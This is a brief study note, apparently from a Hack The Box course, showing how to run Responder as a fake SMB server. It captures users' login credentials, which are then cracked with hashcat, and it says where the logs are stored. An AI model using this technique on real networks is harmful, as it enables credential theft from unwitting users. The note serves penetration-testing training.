# Creating fake SMB Server
```shell-session
nchiato@htb[/htb]$ responder -I <interface name>
```
 eg
```shell-session
sudo responder -I ens33
```
=> Credentials when someone tries to log in => [[hashcat]]

stored under ``/usr/share/responder/logs/

